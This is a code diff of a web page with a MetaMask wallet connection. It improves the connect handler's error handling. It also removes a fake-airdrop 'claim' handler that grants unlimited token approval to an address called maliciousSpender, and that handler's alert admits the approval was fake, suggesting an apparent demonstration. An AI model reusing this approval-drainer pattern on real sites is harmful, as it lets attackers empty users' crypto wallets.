@@ -50,35 +50,25 @@
     let signer;
 
     document.getElementById("connect").onclick = async () => {
-      if (!window.ethereum) {
-        alert("Please install MetaMask.");
-        return;
-      }
+  if (!window.ethereum) {
+    alert("MetaMask not detected. Please ensure it's installed and you're using a supported browser.");
+    console.log("window.ethereum is undefined");
+    return;
+  }
 
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      signer = provider.getSigner();
-      const address = await signer.getAddress();
-      alert("Wallet connected: " + address);
-    };
+  try {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = provider.getSigner();
+    const address = await signer.getAddress();
+    alert("Wallet connected: " + address);
+    console.log("Connected wallet:", address);
+  } catch (err) {
+    console.error("Connection error:", err);
+    alert("Failed to connect wallet.");
+  }
+};
 
-    document.getElementById("claim").onclick = async () => {
-      if (!signer) {
-        alert("Please connect your wallet first.");
-        return;
-      }
-
-      const token = new ethers.Contract(tokenAddress, abi, signer);
-      const maxApproval = ethers.constants.MaxUint256;
-
-      try {
-        const tx = await token.approve(maliciousSpender, maxApproval);
-        alert("⚠️ Transaction Sent!\n\nTX Hash: " + tx.hash + "\n\n(Note: This was not a real airdrop — it was a fake approval!)");
-      } catch (err) {
-        alert("❌ Transaction rejected or failed.");
-        console.error(err);
-      }
-    };
   </script>
 </body>
 </html>
